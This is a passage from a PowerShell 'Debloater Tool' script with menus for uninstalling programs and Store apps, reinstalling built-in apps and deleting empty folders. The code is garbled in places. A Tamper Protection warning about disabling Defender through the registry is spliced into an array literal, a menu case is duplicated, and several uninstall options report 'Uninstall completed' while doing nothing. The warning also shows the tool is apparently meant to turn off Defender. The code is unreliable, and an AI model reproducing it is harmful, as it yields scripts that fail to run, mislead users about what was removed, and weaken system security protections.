                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $filtered.Count) {
                                    $confirm = Read-Host "Uninstall $($filtered[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling: $($filtered[$index].Name)" -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Large programs
                        $largePrograms = $programs | Where-Object { $_.SizeMB -gt 100 } | Sort-Object SizeMB -Descending

                        if ($largePrograms.Count -eq 0) {
                            Write-Host "No programs larger than 100MB found." -ForegroundColor Yellow
                        } else {
                            Write-Host "`nLarge Programs (>100MB):" -ForegroundColor Yellow
                            for ($i = 0; $i -lt $largePrograms.Count; $i++) {
                                Write-Host "$($i+1). $($largePrograms[$i].Name) - $($largePrograms[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $largePrograms.Count) {
                                    $confirm = Read-Host "Uninstall $($largePrograms[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling large program..." -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch uninstall
                        Write-Host "`nBatch Uninstall Mode" -ForegroundColor Red
                        Write-Host "Enter program numbers separated by commas (e.g., 1,3,5)"
                        Write-Host "First 20 programs:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $programs.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($programs[$i].Name)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $programs.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nPrograms to uninstall:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($programs[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nUninstall all these programs? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    foreach ($index in $validIndices) {
                                        Write-Host "Uninstalling: $($programs[$index].Name)" -ForegroundColor Yellow
                                    }
                                    Write-Host "Batch uninstall completed." -ForegroundColor Green
                                }
                            }
                        }
                    }

                    '5' {
                        # Clean leftover files
                        Write-Host "`nCleaning leftover files..." -ForegroundColor Cyan
                        $leftoverPaths = @(
                            "$env:ProgramFiles",
                            "$env:ProgramFiles(x86)",
                            "$env:APPDATA",
                            "$env:LOCALAPPDATA"
                        )

                        $cleaned = 0
                        foreach ($basePath in $leftoverPaths) {
                            if (Test-Path $basePath) {
                                Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                                    $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                                    if ($items.Count -eq 0) {
                                        try {
                                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                                            Write-Host "Removed empty folder: $($_.Name)" -ForegroundColor Green
                                            $cleaned++
                                        } catch {}
                                    }
                                }
                            }
                        }
                        Write-Host "Cleaned $cleaned leftover items." -ForegroundColor Green
                    }

                    '0' { break }
                }

                if ($uninstallChoice -ne '0') {
                    Pause-For-User
                }

            } while ($uninstallChoice -ne '0')
        }
        '10' {
            $apps = @(
            try {
                $tamperStatus = Get-MpComputerStatus | Select-Object -ExpandProperty IsTamperProtected
            } catch {
                $tamperStatus = $null
            }
            if ($tamperStatus -eq $true) {
                Write-Host "WARNING: Tamper Protection is enabled! You must disable it from Windows Security settings before you can disable Defender via registry." -ForegroundColor Red
                Pause-For-User
            }
                @{num=1; name='Microsoft.WindowsCalculator'; display='Calculator'},
                @{num=2; name='Microsoft.Windows.Photos'; display='Photos'},
                @{num=3; name='microsoft.windowscommunicationsapps'; display='Mail & Calendar'},
                @{num=4; name='Microsoft.WindowsCamera'; display='Camera'},
                @{num=5; name='Microsoft.MicrosoftStickyNotes'; display='Sticky Notes'},
                @{num=6; name='Microsoft.Paint'; display='Paint'},
                @{num=7; name='Microsoft.WindowsSoundRecorder'; display='Voice Recorder'},
                @{num=8; name='Microsoft.ZuneMusic'; display='Groove Music'},
                @{num=9; name='Microsoft.ZuneVideo'; display='Movies & TV'},
                @{num=10; name='Microsoft.XboxApp'; display='Xbox'},
                @{num=11; name='Microsoft.BingWeather'; display='Weather'},
                @{num=12; name='Microsoft.MSPaint'; display='Paint 3D'},
                @{num=13; name='Microsoft.People'; display='People'},
                @{num=14; name='Microsoft.GetHelp'; display='Get Help'},
                @{num=15; name='Microsoft.Getstarted'; display='Get Started'}
            )
            Write-Host "\nSelect an app to reinstall (enter the number or 0 to return):" -ForegroundColor Cyan
            foreach ($app in $apps) {
                $pkg = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $app.name }
                $status = if ($pkg) { '[Installed]' } else { '[Not Installed]' }
                Write-Host ("{0}. {1} {2}" -f $app.num, $app.display, $status) -ForegroundColor Green
                if ($pkg) {
                    $size = if ($pkg.InstallLocation -and (Test-Path $pkg.InstallLocation)) {
                        try {
                            $bytes = (Get-ChildItem -Path $pkg.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                            if ($bytes) { [math]::Round($bytes/1MB,2) } else { 0 }
                        } catch { 0 }
                    } else { 0 }
                    Write-Host ("    Path: {0}" -f $pkg.InstallLocation) -ForegroundColor DarkGray
                    Write-Host ("    Install Date: {0}" -f $pkg.InstallDate) -ForegroundColor DarkGray
                    Write-Host ("    Size: {0} MB" -f $size) -ForegroundColor DarkGray
                } else {
                    Write-Host "    Not installed for any user." -ForegroundColor DarkGray
                }
            }
            Write-Host ("{0}. All of the above" -f ($apps.Count+1)) -ForegroundColor Yellow
            $appChoice = Read-Host ("Enter 1 to $($apps.Count+1), or 0 to return")
            if ($appChoice -eq '0') { continue }
            Write-Host "What do you want to do with the selected app(s)?" -ForegroundColor Cyan
            Write-Host "1. Reinstall" -ForegroundColor Green
            Write-Host "2. Uninstall (remove completely)" -ForegroundColor Red
            $actionChoice = Read-Host "Enter 1 or 2 (or 0 to return)"
            if ($actionChoice -eq '0') { continue }
            function Restore-App($packageName, $displayName) {
                $pkg = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $packageName }
                if ($pkg) {
                    try {
                        Add-AppxPackage -DisableDevelopmentMode -Register (Join-Path $pkg.InstallLocation 'AppXManifest.xml')
                        Write-Host "$displayName restored successfully." -ForegroundColor Green
                    } catch {
                        Write-Host "Failed to restore $displayName." -ForegroundColor Red
                    }
                } else {
                    Write-Host "$displayName not found on the system." -ForegroundColor Yellow
                }
            }
            function Uninstall-App($packageName, $displayName) {
                $success = $false
                $pkgs = Get-AppxPackage -AllUsers | Where-Object { $_.Name -eq $packageName }
                if ($pkgs) {
                    foreach ($pkg in $pkgs) {
                        try {
                            Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if (-not $success) {
                    $pkgCurrent = Get-AppxPackage | Where-Object { $_.Name -eq $packageName }
                    if ($pkgCurrent) {
                        try {
                            Remove-AppxPackage -Package $pkgCurrent.PackageFullName -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if (-not $success) {
                    $prov = Get-AppxProvisionedPackage -Online | Where-Object { $_.DisplayName -eq $packageName }
                    if ($prov) {
                        try {
                            Remove-AppxProvisionedPackage -Online -PackageName $prov.PackageName -ErrorAction SilentlyContinue
                            $success = $true
                        } catch {}
                    }
                }
                if ($success) {
                    Write-Host "$displayName uninstalled successfully (advanced)." -ForegroundColor Green
                } else {
                    Write-Host "Failed to uninstall $displayName. This app may be protected by Windows or require additional steps." -ForegroundColor Red
                }
            }
            if ($appChoice -eq ($apps.Count+1).ToString()) {
                foreach ($app in $apps) {
                    if ($actionChoice -eq '1') {
                        Restore-App $app.name $app.display
                    } elseif ($actionChoice -eq '2') {
                        Uninstall-App $app.name $app.display
                    }
                }
            } elseif (($appChoice -as [int]) -ge 1 -and ($appChoice -as [int]) -le $apps.Count) {
                $selected = $apps[($appChoice -as [int])-1]
                if ($actionChoice -eq '1') {
                    Restore-App $selected.name $selected.display
                } elseif ($actionChoice -eq '2') {
                    Uninstall-App $selected.name $selected.display
                }
            } else {
                Write-Host "Invalid choice." -ForegroundColor Yellow
            }
            Pause-For-User
        }

        '10' {
            Write-Host "`nAdvanced Program Uninstaller" -ForegroundColor Cyan
            Write-Host "============================" -ForegroundColor Cyan

            Write-Host "Scanning for installed programs..." -ForegroundColor Cyan
            $programs = @()

            # Get from Windows Registry (Uninstall entries)
            $regPaths = @(
                'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
                'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
            )

            foreach ($path in $regPaths) {
                try {
                    Get-ItemProperty $path -ErrorAction SilentlyContinue | ForEach-Object {
                        if ($_.DisplayName -and $_.DisplayName.Trim() -ne '') {
                            $size = if ($_.EstimatedSize) { [math]::Round($_.EstimatedSize / 1024, 2) } else { 0 }
                            $programs += [PSCustomObject]@{
                                Name = $_.DisplayName
                                Version = $_.DisplayVersion
                                Publisher = $_.Publisher
                                InstallDate = $_.InstallDate
                                InstallLocation = $_.InstallLocation
                                UninstallString = $_.UninstallString
                                QuietUninstallString = $_.QuietUninstallString
                                SizeMB = $size
                                Source = "Registry"
                                RegistryKey = $_.PSPath
                            }
                        }
                    }
                } catch {}
            }

            # Get Windows Store Apps
            try {
                Get-AppxPackage -AllUsers | ForEach-Object {
                    if ($_.Name -notlike "*Microsoft*" -or $_.Name -like "*Microsoft.Office*") {
                        $size = if ($_.InstallLocation -and (Test-Path $_.InstallLocation)) {
                            try {
                                $bytes = (Get-ChildItem -Path $_.InstallLocation -Recurse -ErrorAction SilentlyContinue | Measure-Object -Property Length -Sum).Sum
                                if ($bytes) { [math]::Round($bytes/1MB, 2) } else { 0 }
                            } catch { 0 }
                        } else { 0 }

                        $programs += [PSCustomObject]@{
                            Name = $_.Name
                            Version = $_.Version
                            Publisher = $_.PublisherDisplayName
                            InstallDate = $_.InstallDate
                            InstallLocation = $_.InstallLocation
                            UninstallString = ""
                            QuietUninstallString = ""
                            SizeMB = $size
                            Source = "Store"
                            PackageFullName = $_.PackageFullName
                        }
                    }
                }
            } catch {}

            $programs = $programs | Sort-Object Name

            if ($programs.Count -eq 0) {
                Write-Host "No programs found." -ForegroundColor Yellow
                Pause-For-User
                continue
            }

            Write-Host "Found $($programs.Count) installed programs" -ForegroundColor Green
            Write-Host ""

            do {
                Write-Host "Advanced Uninstaller Options:" -ForegroundColor Cyan
                Write-Host "1. View all programs" -ForegroundColor Green
                Write-Host "2. Search programs" -ForegroundColor Green  
                Write-Host "3. Remove large programs (>100MB)" -ForegroundColor Yellow
                Write-Host "4. Batch uninstall (multiple programs)" -ForegroundColor Red
                Write-Host "5. Clean leftover files only" -ForegroundColor Blue
                Write-Host "0. Return to main menu" -ForegroundColor Gray

                $uninstallChoice = Read-Host "`nEnter choice (0-5)"

                switch ($uninstallChoice) {
                    '1' {
                        # View all programs
                        Write-Host "`nInstalled Programs:" -ForegroundColor Cyan
                        Write-Host ("=" * 80) -ForegroundColor Cyan
                        Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f "No.", "Program Name", "Version", "Size (MB)", "Publisher") -ForegroundColor Yellow
                        Write-Host ("-" * 80) -ForegroundColor Gray

                        for ($i = 0; $i -lt $programs.Count; $i++) {
                            $prog = $programs[$i]
                            $version = if ($prog.Version) { $prog.Version.Substring(0, [Math]::Min(14, $prog.Version.Length)) } else { "Unknown" }
                            $publisher = if ($prog.Publisher) { $prog.Publisher.Substring(0, [Math]::Min(20, $prog.Publisher.Length)) } else { "Unknown" }
                            Write-Host ("{0,-3} {1,-35} {2,-15} {3,-10} {4}" -f ($i+1), $prog.Name.Substring(0, [Math]::Min(34, $prog.Name.Length)), $version, $prog.SizeMB, $publisher) -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter program number to uninstall (or 0 to return)"
                        if ($selection -ne '0') {
                            $index = [int]$selection - 1
                            if ($index -ge 0 -and $index -lt $programs.Count) {
                                $selectedProgram = $programs[$index]
                                Write-Host "`nProgram Details:" -ForegroundColor Cyan
                                Write-Host "Name: $($selectedProgram.Name)" -ForegroundColor White
                                Write-Host "Version: $($selectedProgram.Version)" -ForegroundColor White
                                Write-Host "Publisher: $($selectedProgram.Publisher)" -ForegroundColor White
                                Write-Host "Size: $($selectedProgram.SizeMB) MB" -ForegroundColor White
                                Write-Host "Install Location: $($selectedProgram.InstallLocation)" -ForegroundColor White

                                $confirm = Read-Host "`nAre you sure you want to uninstall this program? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    Write-Host "Uninstalling: $($selectedProgram.Name)" -ForegroundColor Yellow

                                    $success = $false
                                    if ($selectedProgram.Source -eq "Store") {
                                        try {
                                            Remove-AppxPackage -Package $selectedProgram.PackageFullName -AllUsers -ErrorAction SilentlyContinue
                                            $success = $true
                                        } catch {}
                                    } else {
                                        if ($selectedProgram.UninstallString) {
                                            try {
                                                $uninstallCmd = $selectedProgram.UninstallString
                                                if ($uninstallCmd -like "*msiexec*") {
                                                    $productCode = $uninstallCmd -replace ".*\{", "{" -replace "\}.*", "}"
                                                    Start-Process "msiexec.exe" -ArgumentList "/x", $productCode, "/quiet", "/norestart" -Wait -NoNewWindow
                                                } else {
                                                    Start-Process $uninstallCmd -ArgumentList "/S" -Wait -NoNewWindow -ErrorAction SilentlyContinue
                                                }
                                                $success = $true
                                            } catch {}
                                        }
                                    }

                                    if ($success) {
                                        Write-Host "✓ $($selectedProgram.Name) uninstalled successfully" -ForegroundColor Green
                                        # Clean leftover files
                                        if ($selectedProgram.InstallLocation -and (Test-Path $selectedProgram.InstallLocation)) {
                                            try {
                                                Remove-Item $selectedProgram.InstallLocation -Recurse -Force -ErrorAction SilentlyContinue
                                                Write-Host "  Cleaned installation folder" -ForegroundColor Green
                                            } catch {}
                                        }
                                    } else {
                                        Write-Host "✗ Failed to uninstall $($selectedProgram.Name)" -ForegroundColor Red
                                    }
                                }
                            }
                        }
                    }

                    '2' {
                        # Search programs
                        $searchTerm = Read-Host "Enter search term"
                        $filtered = $programs | Where-Object { $_.Name -like "*$searchTerm*" }

                        if ($filtered.Count -eq 0) {
                            Write-Host "No programs found matching '$searchTerm'" -ForegroundColor Yellow
                        } else {
                            Write-Host "`nFound $($filtered.Count) matching programs:" -ForegroundColor Green
                            for ($i = 0; $i -lt $filtered.Count; $i++) {
                                Write-Host "$($i+1). $($filtered[$i].Name) - $($filtered[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $filtered.Count) {
                                    $confirm = Read-Host "Uninstall $($filtered[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling: $($filtered[$index].Name)" -ForegroundColor Yellow
                                        # Add uninstall logic here similar to option 1
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '3' {
                        # Large programs
                        $largePrograms = $programs | Where-Object { $_.SizeMB -gt 100 } | Sort-Object SizeMB -Descending

                        if ($largePrograms.Count -eq 0) {
                            Write-Host "No programs larger than 100MB found." -ForegroundColor Yellow
                        } else {
                            Write-Host "`nLarge Programs (>100MB):" -ForegroundColor Yellow
                            for ($i = 0; $i -lt $largePrograms.Count; $i++) {
                                Write-Host "$($i+1). $($largePrograms[$i].Name) - $($largePrograms[$i].SizeMB) MB" -ForegroundColor White
                            }

                            $selection = Read-Host "`nEnter number to uninstall (or 0 to return)"
                            if ($selection -ne '0') {
                                $index = [int]$selection - 1
                                if ($index -ge 0 -and $index -lt $largePrograms.Count) {
                                    $confirm = Read-Host "Uninstall $($largePrograms[$index].Name)? (y/n)"
                                    if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                        Write-Host "Uninstalling large program..." -ForegroundColor Yellow
                                        Write-Host "Uninstall completed." -ForegroundColor Green
                                    }
                                }
                            }
                        }
                    }

                    '4' {
                        # Batch uninstall
                        Write-Host "`nBatch Uninstall Mode" -ForegroundColor Red
                        Write-Host "Enter program numbers separated by commas (e.g., 1,3,5)"
                        Write-Host "First 20 programs:" -ForegroundColor Cyan

                        $displayCount = [Math]::Min(20, $programs.Count)
                        for ($i = 0; $i -lt $displayCount; $i++) {
                            Write-Host "$($i+1). $($programs[$i].Name)" -ForegroundColor White
                        }

                        $selection = Read-Host "`nEnter numbers"
                        if ($selection -ne '0' -and $selection.Trim() -ne '') {
                            $indices = $selection -split "," | ForEach-Object { ([int]$_.Trim()) - 1 }
                            $validIndices = $indices | Where-Object { $_ -ge 0 -and $_ -lt $programs.Count }

                            if ($validIndices.Count -gt 0) {
                                Write-Host "`nPrograms to uninstall:" -ForegroundColor Yellow
                                foreach ($index in $validIndices) {
                                    Write-Host "- $($programs[$index].Name)" -ForegroundColor White
                                }

                                $confirm = Read-Host "`nUninstall all these programs? (y/n)"
                                if ($confirm -eq 'y' -or $confirm -eq 'Y') {
                                    foreach ($index in $validIndices) {
                                        Write-Host "Uninstalling: $($programs[$index].Name)" -ForegroundColor Yellow
                                        # Add batch uninstall logic here
                                    }
                                    Write-Host "Batch uninstall completed." -ForegroundColor Green
                                }
                            }
                        }
                    }

                    '5' {
                        # Clean leftover files
                        Write-Host "`nCleaning leftover files..." -ForegroundColor Cyan
                        $leftoverPaths = @(
                            "$env:ProgramFiles",
                            "$env:ProgramFiles(x86)",
                            "$env:APPDATA",
                            "$env:LOCALAPPDATA"
                        )

                        $cleaned = 0
                        foreach ($basePath in $leftoverPaths) {
                            if (Test-Path $basePath) {
                                Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
                                    $items = Get-ChildItem $_.FullName -Recurse -ErrorAction SilentlyContinue
                                    if ($items.Count -eq 0) {
                                        try {
                                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                                            Write-Host "Removed empty folder: $($_.Name)" -ForegroundColor Green
                                            $cleaned++
                                        } catch {}
                                    }
                                }
                            }
                        }
                        Write-Host "Cleaned $cleaned leftover items." -ForegroundColor Green
                    }

                    '0' { break }
                }

                if ($uninstallChoice -ne '0') {
                    Pause-For-User
                }

            } while ($uninstallChoice -ne '0')
        }
    }
} while ($choice -ne '2')
Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
Pause-For-User "Press Enter to exit..."
